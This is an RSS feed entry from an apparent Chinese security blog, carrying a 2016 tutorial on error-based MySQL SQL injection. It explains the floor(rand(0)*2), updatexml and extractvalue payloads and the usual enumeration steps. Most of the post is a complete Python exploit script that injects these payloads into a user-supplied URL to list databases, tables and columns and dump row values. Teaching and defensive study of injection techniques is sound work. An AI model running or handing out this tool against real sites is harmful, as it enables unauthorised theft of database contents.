<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>报错注入 on </title>
    <link>http://wyb0.com/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
    <description>Recent content in 报错注入 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Wed, 22 Jun 2016 15:30:54 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SQL注入之报错型注入</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-前提:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x00 前提&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用方式:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x01 利用方式&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;count(*)、floor()、rand()、group by不可或缺&lt;br /&gt;
报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制):&lt;br /&gt;
?id=2&amp;rsquo; and (select 1 from &lt;font color=&#34;00CDCD&#34;&gt;(select &lt;u&gt;count(*),&lt;b&gt;concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x&lt;/b&gt;&lt;/u&gt; from information_schema.tables group by x )a&lt;/font&gt;
)--+&lt;br /&gt;
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(&lt;font color=&#34;00CDCD&#34;&gt;SELECT @@version&lt;/font&gt;),0x7e),1)--+&lt;br /&gt;
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (&lt;font color=&#34;00CDCD&#34;&gt;select @@version&lt;/font&gt;),0x7e))--+&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-公式解析:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x02 公式解析&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;floor()是取整数
rand()在0和1之间产生一个随机数
rand(0)*2将取0到2的随机数
floor(rand()*2)有两条记录就会报错
floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的
count(*)是用来统计结果的，相当于刷新一次结果
group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-注入步骤:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x03 注入步骤&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;得到闭合字符&lt;/li&gt;
&lt;li&gt;猜列数、尝试爆显示位&lt;/li&gt;
&lt;li&gt;得到数据库个数和数据库名&lt;/li&gt;
&lt;li&gt;得到表个数和表名&lt;/li&gt;
&lt;li&gt;得到列数量和列名&lt;/li&gt;
&lt;li&gt;得到列值&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;猜测闭合字符:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;猜测闭合字符&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_closed_character.png&#34; alt=&#34;得到闭合字符&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_check_closed_character.png&#34; alt=&#34;确认闭合字符&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;猜测列数:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;猜测列数&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_order_by.png&#34; alt=&#34;得到列数&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;尝试得到显示位:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;尝试得到显示位&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_display_point.png&#34; alt=&#34;尝试得到显示位&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到数据库个数:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到数据库个数&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_db_num.png&#34; alt=&#34;报错得到数据库个数&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到数据库名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到数据库名&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_db_name.png&#34; alt=&#34;报错得到数据库名&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到表名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到表名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_table_num.png&#34; alt=&#34;报错得到表的个数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_table_name.png&#34; alt=&#34;报错得到表名&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到列名:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到列名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_num.png&#34; alt=&#34;报错得到列的个数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_name1.png&#34; alt=&#34;报错得到列名1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_name2.png&#34; alt=&#34;报错得到列名2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列值:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;得到列值&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_value_num.png&#34; alt=&#34;报错得到数据条数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_column_value.png&#34; alt=&#34;报错得到列的值&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附上利用代码:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x04 附上利用代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-  

import re
import urllib
import urllib2
import binascii
from pyfiglet import figlet_format
from optparse import OptionParser


# --dbs url
def getAllDatabases(url):
    # print url
    payload = &amp;quot;&#39; and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot;
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    dbs_num_url = url + payload
    # print dbs_num_url
    response = urllib2.urlopen(dbs_num_url)
    html = response.read()
    # print html
    # ~~:~~5~~:~~
    dbs_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;, html).group(1))
    print &amp;quot;database num: %d&amp;quot; % dbs_num
    print &amp;quot;database name: &amp;quot;
    for index in xrange(0,dbs_num):
        payload = &amp;quot;&#39; and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % index
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        db_name_url = url + payload
        response = urllib2.urlopen(db_name_url)
        html = response.read()
        db_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
        print &amp;quot;\t%s&amp;quot; % db_name

def getCurrentDb(url):
    # print &amp;quot;CurrentDb is: aaaa&amp;quot;
    # print url

    current_db_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot;
    response = urllib2.urlopen(current_db_name_url)
    html = response.read()
    current_db_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
    print &amp;quot;Current database is: %s&amp;quot; % current_db_name

def getCurrentUser(url):
    db_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot;
    response = urllib2.urlopen(db_name_url)
    html = response.read()
    user_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;, html).group(1)
    print &amp;quot;Current user is: %s&amp;quot; % user_name

# --tables -D database url
def getAllTablesByDb(url,db_name):
    # print db_name
    # print url
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print db_name_hex
    tables_num_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot; % db_name_hex
    response = urllib2.urlopen(tables_num_url)
    html = response.read()
    # print html
    tables_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;, html).group(1))
    # print tables_num
    print &amp;quot;%s has %d table&amp;quot; % (db_name, tables_num)
    print &amp;quot;table name: &amp;quot;
    for index in xrange(0,tables_num):
        tables_name_url = url + &amp;quot;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s/**/limit/**/%d,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&amp;quot; % (db_name_hex, index)
        response = urllib2.urlopen(tables_name_url)
        html = response.read()
        # print html
        table_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1)
        print &amp;quot;\t%s&amp;quot; % table_name

def getAllColumnsByTable(url,table_name,db_name):
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (table_name_hex,db_name_hex)
    # print payload
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    column_num_url = url + payload
    response = urllib2.urlopen(column_num_url)
    html = response.read()
    column_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;,html).group(1))
    # print column_num
    print &amp;quot;Table %s of the %s has %d columns&amp;quot; % (table_name,db_name,column_num)
    print &amp;quot;Table %s contains the column name:&amp;quot; % table_name
    for index in xrange(0,column_num):
        payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (table_name_hex,db_name_hex,index)
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        # print payload
        column_value_url = url + payload
        response = urllib2.urlopen(column_value_url)
        html = response.read()
        # print html
        column_name = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1)
        print &amp;quot;\t%s&amp;quot; % column_name


def getAllcontent(url,column_name,table_name,db_name):
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(&#39;,&#39;)
    num_column = len(column_name) #想得到的字段的个数
    # print column_name
    # print num_column

    payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (db_name,table_name)
    # print payload
    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
    column_value_url = url + payload
    response = urllib2.urlopen(column_value_url)
    html = response.read()
    # print html
    column_value_num = int(re.search(r&#39;~~:~~(\d*?)~~:~~&#39;,html).group(1))
    print &amp;quot;Table %s has %d columns&amp;quot; % (table_name,column_value_num)
    print &amp;quot;Table %s column values:&amp;quot; % table_name

    title = &amp;quot;\t&amp;quot;
    str_value = &amp;quot;0x7e7e3a7e7e,&amp;quot;
    for x in xrange(0,num_column):
        title += &amp;quot;%-15s&amp;quot; % column_name[x]
        str_value += &amp;quot;%s,0x20,&amp;quot; % column_name[x]
    str_value = &amp;quot;,&amp;quot;.join(str_value.split(&#39;,&#39;)[0:-2]) +&amp;quot;,0x7e7e3a7e7e&amp;quot;
    # print str_value
    
    print title
    for index in xrange(0,column_value_num):
        payload = &amp;quot;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(%s) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;quot; % (str_value,db_name,table_name,index)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        value_url = url + payload
        response = urllib2.urlopen(value_url)
        html = response.read()
        # print html
        value = re.search(r&#39;~~:~~(.*?)~~:~~&#39;,html).group(1).split()
        # print value
        stri = &amp;quot;\t&amp;quot;
        # print len(value)
        if len(value)==0:
            print &amp;quot;&amp;quot;
        else:
            for x in xrange(0,num_column):
                stri += &amp;quot;%-15s&amp;quot; % value[x]
            print stri

def main():
    print figlet_format(&amp;quot;sqli-error&amp;quot;)
    parser = OptionParser()
    parser.add_option(&amp;quot;-u&amp;quot;,&amp;quot;--URL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;url&amp;quot;,
              help=&amp;quot;get url&amp;quot;)
    parser.add_option(&amp;quot;-D&amp;quot;,&amp;quot;--DB&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;db_name&amp;quot;,
              help=&amp;quot;get database name&amp;quot;)
    parser.add_option(&amp;quot;-T&amp;quot;,&amp;quot;--TBL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;table_name&amp;quot;,
              help=&amp;quot;get table name&amp;quot;)
    parser.add_option(&amp;quot;-C&amp;quot;,&amp;quot;--COL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;column_name&amp;quot;,
              help=&amp;quot;get column name&amp;quot;)

    parser.add_option(&amp;quot;--dbs&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dbs&amp;quot;,help=&amp;quot;get all database name&amp;quot;)
    parser.add_option(&amp;quot;--current-db&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_db&amp;quot;,help=&amp;quot;get current database name&amp;quot;)
    parser.add_option(&amp;quot;--current-user&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_user&amp;quot;,help=&amp;quot;get current user name&amp;quot;)
    parser.add_option(&amp;quot;--tables&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;tables&amp;quot;,help=&amp;quot;get tables from databases&amp;quot;)
    parser.add_option(&amp;quot;--columns&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;columns&amp;quot;,help=&amp;quot;get columns from tables&amp;quot;)
    parser.add_option(&amp;quot;--dump&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dump&amp;quot;,help=&amp;quot;get value&amp;quot;)
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print &amp;quot;you input: sqli-error.py -u www.xxx.com/?id=xx&amp;quot;


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>